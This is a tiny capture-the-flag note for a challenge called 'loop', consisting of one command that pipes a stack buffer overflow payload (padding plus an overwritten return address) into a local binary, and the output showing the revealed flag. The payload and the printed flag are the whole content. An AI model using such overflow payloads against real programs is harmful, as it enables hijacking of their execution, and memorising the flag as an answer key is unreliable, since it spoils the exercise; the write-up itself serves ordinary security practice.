# loop
```bash=
$ python -c 'import sys;sys.stdout.buffer.write(b"A"*28 + b"\x76\x84\x04\x08")' | ./loop 
buf address: 0xfffbfa30
flag is taskctf{n1c3_r3wr171ng!!!}
Segmentation fault (core dumped)
```